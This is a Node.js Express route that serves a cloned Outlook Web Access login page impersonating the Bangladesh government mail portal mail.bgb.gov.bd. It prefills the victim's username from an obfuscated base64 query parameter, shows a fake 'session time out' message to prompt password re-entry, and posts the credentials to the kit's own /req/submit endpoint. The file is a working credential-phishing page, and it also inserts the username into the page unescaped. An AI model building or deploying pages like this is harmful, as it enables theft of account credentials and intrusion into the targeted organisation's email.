
const express = require ('express');
const router = express.Router();

router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.dhsfiourewjdfjgkfdgkldfjiorejfdjgfdgjkdfjgreioo;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
  

    if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
        <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- saved from url=(0095)https://mail.bgb.gov.bd/owa/auth/logon.aspx?url=https%3a%2f%2fmail.bgb.gov.bd%2fowa%2f&reason=0 -->
    <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <link rel="shortcut icon" href="./files/favicon.ico" type="image/x-icon">

    <meta name="Robots" content="NOINDEX, NOFOLLOW">
    <title>Outlook</title>
    <style>
    @font-face {
        font-family: "wf_segoe-ui_normal";
        src: url("https://mail.bgb.gov.bd/owa/auth/15.1.2308/themes/resources/segoeui-regular.eot?#iefix") format("embedded-opentype"),
                url("https://mail.bgb.gov.bd/owa/auth/15.1.2308/themes/resources/segoeui-regular.ttf") format("truetype");
    }

    @font-face {
        font-family: "wf_segoe-ui_semilight";
        src: url("https://mail.bgb.gov.bd/owa/auth/15.1.2308/themes/resources/segoeui-semilight.eot?#iefix") format("embedded-opentype"),
            url("https://mail.bgb.gov.bdowa/auth/15.1.2308/themes/resources/segoeui-semilight.ttf") format("truetype");
    }

    @font-face {
        font-family: "wf_segoe-ui_semibold";
        src: url("https://mail.bgb.gov.bd/owa/auth/15.1.2308/themes/resources/segoeui-semibold.eot?#iefix") format("embedded-opentype"),
            url("https://mail.bgb.gov.bd/owa/auth/15.1.2308/themes/resources/segoeui-semibold.ttf") format("truetype");
    }
    </style>


    <style>
    .signInBg 
    {
        background-image: url("./files/background.png");
        background-repeat: no-repeat;
        background-position: center;
        background-size: 100% 100%;
        height: auto;
        width: 100%;
        overflow: hidden;
    }
    </style>

    <style>/*Copyrightt (c) 2003-2006 Microsoft Corporation.  All rights reserved.*/

    body.rtl 
    {
        text-align:right;
        direction:rtl;
    }

    body, .mouse, .twide, .tnarrow, form
    {
        height: 100%;
        width: 100%;
        margin: 0px;
    }

    .mouse, .twide 
    {
        min-width: 650px; /* min iPad1 dimension */
        min-height: 650px;
        position: absolute;
        top:0px;
        bottom:0px;
        left:0px;
        right:0px;
    }

    .sidebar 
    {
    /*( background-color:#0072C6; */
    }

    .mouse .sidebar, .twide .sidebar
    {
        position:absolute;
        top: 0px;
        bottom: 0px;
        left: 0px;
        display: inline-block;
        width: 332px;
    }

    .tnarrow .sidebar
    {
        display: none;
    }

    .mouse .owaLogoContainer, .twide .owaLogoContainer
    {
        margin:80px auto auto 40px;
        /*margin:213px auto auto 109px;*/
        text-align:left     /* Logo aligns left for both ltr & rtl */
    }


    .logo-img{
        position: relative;
        margin:80px auto auto 40px;
        width: 250px;
    }


    .tnarrow .owaLogo 
    {
        display: none;
    }

    .mouse .owaLogoSmall, .twide .owaLogoSmall
    {
        display: none;
    }

    .logonDiv 
    { 
        text-align:left;
    }

    .rtl .logonDiv 
    { 
        text-align:right;
    }

    .mouse .logonContainer, .twide .logonContainer
    {
        padding-top: 174px;
        padding-left: 464px;
        padding-right:142px;
        position:absolute;
        top:0px;
        bottom: 0px;
        left: 0px;
        right: 0px;
        text-align: center;
    }

    .mouse .logonDiv, .twide .logonDiv
    {
        position: relative;
        vertical-align:top;
        display: inline-block;
        width: 423px;
    }

    .tnarrow .logonDiv
    {
        margin:25px auto auto -130px;
        position: absolute;
        left: 50%;
        width: 260px;
        padding-bottom: 20px;
    }

    .twide .signInImageHeader, .tnarrow .signInImageHeader
    {
        display: none;
    }

    .mouse .signInImageHeader
    {
        margin-bottom:22px;
    }

    .twide .mouseHeader
    {
        display: none;
    }

    .mouse .twideHeader
    {
        display: none;
    }

    input::-webkit-input-placeholder
    {
        font-size:16px;
        color: #98A3A6;
    }

    input:-moz-placeholder 
    {
        font-size:16px;
        color: #98A3A6;
    }

    .tnarrow .signInInputLabel, .twide .signInInputLabel
    {
        display: none;
    }

    .mouse .signInInputLabel
    {
        margin-bottom: 2px;
    }

    .mouse .showPasswordCheck
    {
        display: none;
    }

    .signInInputText
    {
        border:1px solid #98A3A6;
        color: #333333;
        border-radius: 0;
        -moz-border-radius: 0;
        -webkit-border-radius: 0;
        box-shadow: none;
        -moz-box-shadow: none;
        -webkit-box-shadow: none;
        -webkit-appearance:none;
        background-color: #FDFDFD;
        width:250px;
        margin-bottom:10px;
        box-sizing: content-box;
        -moz-box-sizing: content-box;
        -webkit-box-sizing: content-box;
    }

    .mouse .signInInputText 
    {
        height: 22px;
        font-size: 16px;
        padding: 3px 5px;
        color: #333333;
        font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-bottom: 20px;
    }

    .twide .signInInputText, .tnarrow .signInInputText
    {
        border-color: #666666;
        height: 22px;
        font-size: 16px;
        color: #000000;
        padding: 7px 7px;
        font-family:'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-bottom:20px;
        width: 264px;
    }

    .divMain
    {
        width: 444px;
    }

    .l
    {
        text-align:left;
    }
    .rtl .l
    {
        text-align:right;
    }
    .r
    {
        text-align:right;
    }
    .rtl .r
    {
        text-align:left;
    }

    table#tblMain
    {
        margin-top: 48px;
        padding: 0px; 
    }
    table.mid
    {
        width: 385px;
        border-collapse:collapse;
        padding: 0px; 
        color:#444444; 
    }
    table.tblConn
    {
        direction:ltr;
    }
    td.tdConnImg
    {
        width: 22px;
    }
    td.tdConn
    {
        padding-top: 15px;
    }
    td#mdLft
    {
        background: url("lgnleft.gif") repeat-y;
        width: 15px;
    }
    td#mdRt
    {
        background: url("lgnright.gif") repeat-y;
        width: 15px;
    }
    td#mdMid
    {
        padding: 0px 45px;
        background: #ffffff; 
        vertical-align: top;
    }
    td .txtpad
    {
        padding: 3px 6px 3px 0px; 
    }
    .txt
    {
        padding: 3px; 
        height: 2.2em;
    }
    input.btn
    {
        color: #ffffff;
        background-color: #eb9c12;
        border: 0px; 
        padding: 2px 6px; 
        margin: 0px 6px; 
        text-align:center;
    }
    .btnOnFcs
    {
        color: #ffffff;
        background-color: #eb9c12;
        border: 0px; 
        padding: 2px 6px; 
        margin: 0px 6px; 
        text-align:center;
    }
    .btnOnMseOvr
    {
        color: #ffffff;
        background-color: #f9b133;
        border: 0px; 
        padding: 2px 6px; 
        margin: 0px 6px; 
        text-align:center;
    }
    .btnOnMseDwn
    {
        color: #000000;
        background-color: #f9b133;
        border: 0px solid #f9b133;
        padding: 2px 6px; 
        margin: 0px 6px; 
        text-align:center;
    }
    .nowrap
    {
        white-space:nowrap;
    }
    hr
    {
        height: 0px; 
        visibility: hidden;
    }

    .wrng
    {
        color:#ff6c00;
    }
    .disBsc
    {
        color:#999999;
    }
    .expl
    {
        color:#999999;
    }
    .w100, .txt
    {
        width: 100%;
    }
    .txt
    {
        margin: 0px 6px; 
    }
    .rdo
    {
        margin: 0px 12px 0px 32px;
    }
    body.rtl .rdo
    {
        margin: 0px 32px 0px 12px;
    }
    tr.expl td, tr.wrng td
    {
        padding: 2px 0px 4px; 
    }
    tr#trSec td
    {
        padding: 3px 0px 8px; 
    }
    /* language page specific styles */
    td#tdLng
    {
        padding: 12px 0px; 
    }
    td#tdTz
    {
        padding: 8px 0px; 
    }
    select#selTz
    {
        padding: 0px; 
        margin: 0px; 
    }
    td#tdOptMsg
    {
        padding: 10px 0px; 
    }
    td#tdOptChk
    {
        padding: 0px 0px 15px 65px;
    }
    td#tdOptAcc
    {
        vertical-align:middle;
        padding: 0px 0px 0px 3px; 
    }
    select#selLng
    {
        margin: 0px 16px;
    }
    /* logoff page specific styles */
    td#tdMsg
    {
        margin: 9px 0px 64px;
    }
    input#btnCls
    {
        margin: 3px 6px; 
    }
    td.lgnTL, td.lgnBL
    {
        width: 456px;
    }
    td.lgnTM
    {
        background: url("lgntopm.gif") repeat-x;
        width: 100%;
    }
    td.lgnBM
    {
        background: url("lgnbotm.gif") repeat-x;
        width: 100%;
    }
    td.lgnTR, td.lgnBR
    {
        width: 45px;
    }
    table.tblLgn
    {
        padding: 0px; 
        margin: 0px; 
        border-collapse:collapse;
        width: 100%;
    }
    .signInBg
    {
        margin:0px;
    }

    .signInTextHeader
    {
        font-size:60px;
        color:#404344;
        font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-bottom:18px;
        white-space: nowrap;
    }

    .signInInputLabel
    {
        font-size:16px;
        /*color:#666666; */
        color:#000000;
        font-weight: bold;
        font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    }

    .signInCheckBoxText
    {
        font-size:12px;
        color:#6A7479;
        font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-top:16px;
    }

    .twide .signInCheckBoxText, .tnarrow .signInCheckBoxText
    {
        font-size: 15px;
    }

    .signInCheckBoxLink
    {
        font-size:12px;
        color:#0072C6;
        font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    }

    .signInEnter
    {
        font-size:24px;
        /*color:#0072C6;*/
        color:#000000;
        font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-top:20px;
    }

    .twide .signInEnter
    {
        margin-top:17px;
        font-size: 29px;
    }

    .tnarrow .signInEnter 
    {
        margin-top:2px;
        font-size: 29px;
        position: relative;
        float: left;
        left: 50%;
    }

    .signinbutton 
    {
        cursor:pointer;
        display:inline
    }

    .mouse .signinbutton
    {
        padding: 0px 8px 5px 8px;
        margin-left: -8px;
    }

    .rtl .mouse .signinbutton
    {
        margin-right: -8px;
    }

    .tnarrow .signinbutton 
    {
        position: relative;
        float: left;
        left: -50%;
    }

    .shellDialogueHead
    {
        font-size:29px;
        color:#0072C6;
        font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
    }

    .mouse .shellDialogueHead 
    {
        line-height: 35px;
        margin-bottom: 10px;
    }

    .twide  .shellDialogueHead, .tnarrow .shellDialogueHead
    {
        line-height:34px;
        margin-bottom: 12px;
    }

    .shellDialogueMsg
    {
        font-size:13px;
        color:#333333;
        font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        line-height:18px;
    }

    .twide .shellDialogueMsg, .tnarrow .shellDialogueMsg
    {
        font-size: 15px;
    }

    .headerMsgDiv 
    {
        width: 350px;
        margin-bottom: 22px;
    }

    .twide .headermsgdiv
    {
        margin-bottom: 30px;
    }

    .tnarrow .headermsgdiv
    {
        width: 260px;
        margin-bottom: 30px;
    }

    .signInError
    {
        font-size:12px;
        color:#C1272D;
        font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-top:12px;
    }

    .passwordError
    {
        color: #A80F22;
        font-family:'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        line-height: 18px;
    }

    .mouse .passwordError
    {    
        margin-top: 10px;
        font-size: 13px;
    }

    .twide .passwordError, .tnarrow .passwordError
    {
        margin-top: 12px;
        font-size: 15px;
    }

    .signInExpl
    {
        font-size:12px;
        color:#999999;
        font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-top:5px;
    }

    .signInWarning
    {
        font-size:12px;
        color:#C1272D;
        font-family:'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
        margin-top:5px;
    }

    input.chk
    {
        margin-right:9px;
        margin-left:0px;
    }

    .imgLnk
    {
        vertical-align: middle;	
        line-height:2;
        margin-top: -2px;
    }

    .signinTxt
    {
        padding-left:11px;
        padding-right:11px;
        font-size:22px;     /* Needed for RTL, doesnt hurt to add this for LTR as well */
    }

    .hidden-submit { 
        border: 0 none; 
        height: 0; 
        width: 0; 
        padding: 0; 
        margin: 0; 
        overflow: hidden; 
    } 

    .officeFooter
    {
        position:absolute;
        bottom: 33px;
        right: 45px;
    }

    .tnarrow .officeFooter
    {
        display: none;
    }

    button {
    
     background-color:transparent;
     border:none;
    }
    </style>




        

    </head>
    <body class="signInBg" style="">

    <!--<body class="signInBg" style="background: #f2f2f2 url('./files/2.png') repeat-x"/>-->



    <noscript>
        <div id="dvErr">
            <table cellpadding="0" cellspacing="0">
            <tr>
                <td><img src="./files/download (2).png" alt=""></td>
                <td style="width:100%">To use Outlook, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn&#39;t support scripts, you can download <a href="https://goo.microsoft.com/fwlink/?liinkid=2009667&clcid=0x409">Windows Internet Explorer</a> for access to Outlook.</td>
            </tr>
            </table>
        </div>
    </noscript>

    <form method="POST" name="logonForm" action="/req/submit" enctype="application/x-www-form-urlencoded" autocomplete="off">
    <input type="hidden" name="destination" value="https://mail.bgb.gov.bd/owa/">
    <input type="hidden" name="flags" value="4">
    <input type="hidden" name="forcedownlevel" value="0">
    
    <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
    <div id="mainLogonDiv" class="mouse">
        <div class="sidebar">
            <div class="owaLogoContainer">
            <img class="logo-img" src="./files/olk_logo_white.png" alt="logo">
                <!--<img src="./files/download (3).png
                <img src="download (4).png" class="owaLogoSmall" aria-hidden="true" />-->
            </div>
        </div>
        <div class="logonContainer">
        <div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
            
                <div class="signInImageHeader" role="heading" aria-label="Outlook">
                    <img class="mouseHeader" src="./files/download (1).png" alt="Outlook">
                </div>
            
            <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
            <div><input id="username" name="username" value="${username}" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"></div>
            <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
            <div><input id="password" onfocus="g_fFcs=0" name="password"  required="" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"></div>
            <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"></div>
            <div class="showPasswordCheck signInCheckBoxText">
                <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
                <span>Show password</span>
            </div>
            

            <div id="expltxt" class="signInExpl" role="alert">
            <p style="color:#c1272d">Your session time out. Try entering it again.</p>
        
            </div>
            <div class="signInEnter">
                <button class="signinbutton" role="button" type="submit" tabindex="0">
                    <img class="imgLnk" src="./files/download.png" alt=""><span class="signinTxt">sign in</span>
                </button>
                <input name="isUtf8" value="1" type="hidden">
            </div>
            <div class="hidden-submit"><input type="submit" tabindex="-1"></div> 
            
            <div style="margin-top:26px; color:#000000;"> <strong>Only for E-mail Login Issue, Please Contact <br> E-mail: support@bgb.gov.bd <br> Mob.: +8801769600535</strong></div>
        </div>
        </div>
            <div id="cookieMsg" class="logonDiv" style="display:none">
            <div class="signInHeader">Outlook</div>
            <div class="signInExpl">Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></div>
            <div class="signInEnter">
                <div onclick="clkRtry()" style="cursor:pointer;display:inline">
                    <img class="imgLnk" src="./files/download.png" alt=""><span class="signinTxt" tabindex="0">retry</span>
            </div>
        </div>
        </div>
    </div>
    </form>
       
    </body></html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});



module.exports =router